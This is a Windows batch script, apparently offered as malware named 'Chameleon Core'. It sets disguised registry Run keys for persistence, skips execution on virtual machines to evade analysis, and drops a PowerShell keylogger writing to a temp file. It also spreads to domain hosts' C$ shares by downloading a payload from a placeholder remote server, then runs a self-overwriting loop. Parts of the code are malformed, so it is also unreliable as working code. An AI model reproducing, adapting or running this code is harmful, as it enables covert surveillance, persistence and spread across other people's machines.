@echo off  
setlocal

echo Initiating Chameleon Core...

:persistence  
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /t REG_SZ /d "%TEMP%\chameleon.bat" /f  
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /t REG_SZ /d "%TEMP%\chameleon.bat" /f  
copy "%~f0" "%TEMP%\chameleon.bat"

:anti_vm_check  
systeminfo | find "Virtual Machine"  
if %errorlevel% equ 0 (  
echo Running in a virtual machine. Limiting functionality.  
goto :cleanup  
)

:delay_1  
timeout /t 30 /nobreak > nul

:keylogger_init  
echo @echo off > "%TEMP%\keylogger.bat"  
echo powershell -Command "$([char[]](0..255)) | ForEach-Object {Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int nVirtKey);' -Name 'Keyboard' -Namespace 'Win32' -PassThru} ; [Win32.Keyboard]::GetAsyncKeyState(0x20); if ($_) {$date = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\" ; $key = [char](0x20) ; Add-Content -Path \"%TEMP%\keylog.txt\" -Value \"[$date] Key Pressed: $key\"}" >> "%TEMP%\keylogger.bat"  
start /min "%TEMP%\keylogger.bat"

:delay_2  
timeout /t 60 /nobreak > nul

:lateral_movement_init  
echo @echo off > "%TEMP%\lateral_movement.bat"  
echo for /f "tokens=2 delims=\\" %a in ('net view /domain') do ( >> "%TEMP%\lateral_movement.bat"  
echo if exist "\\%a\c$" ( >> "%TEMP%\lateral_movement.bat"  
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('http://your.remote.server/core.bat', '\\%a\c$\core.bat')" >> "%TEMP%\lateral_movement.bat"  
echo ) >> "%TEMP%\lateral_movement.bat"  
echo ) >> "%TEMP%\lateral_movement.bat"  
start /min "%TEMP%\lateral_movement.bat"

:self_modification  
echo @echo off > "%TEMP%\temp_patch.bat"  
echo echo Updating core functionality... >> "%TEMP%\temp_patch.bat"  
echo echo Chameleon version 2.0 >> "%TEMP%\temp_patch.bat"  
echo echo Applied new stealth techniques >> "%TEMP%\temp_patch.bat"  
echo echo More robust persistence... >> "%TEMP%\temp_patch.bat"  
echo echo New lateral movement code... >> "%TEMP%\temp_patch.bat"

:apply_patch  
powershell -Command "(Get-Content '%TEMP%\temp_patch.bat') | Out-File -FilePath '%TEMP%\chameleon.bat' -Encoding utf8"  
del "%TEMP%\temp_patch.bat"

:loop  
timeout /t 120 /nobreak > nul  
goto :self_modification

:cleanup  
del "%TEMP%\keylogger.bat"  
del "%TEMP%\lateral_movement.bat"  
exit  
endlocal  